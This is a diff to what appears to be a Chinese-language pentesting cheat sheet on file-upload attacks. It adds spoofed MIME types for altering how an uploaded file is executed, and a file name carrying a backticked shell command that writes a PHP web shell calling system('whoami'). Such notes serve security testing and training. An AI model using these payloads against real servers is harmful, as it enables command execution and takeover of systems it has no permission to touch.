@@ -31,6 +31,14 @@ Content-Type: image/png
 Content-Type: text/plain
 ```
 
+伪造 MIME 类型篡改执行方式
+
+```
+Content-Type: text/html
+Content-Type: text/javascript
+Content-Type: image/svg+xml
+```
+
 ### 2.3. Path Traversal
 
 若文件上传后无法执行, 可尝试利用 Path Traversal 将文件上传到上级目录执行
@@ -102,6 +110,14 @@ def queueRequests(target, wordlists):
 
 def handleResponse(req, interesting):
     table.add(req)
+```
+
+### 2.8. 命令执行
+
+目标会将上传文件移动到其它目录, 可能存在命令执行
+
+```
+`echo '<?php system('whoami'); ?>' > shell.php` + .png
 ```
 
 ---
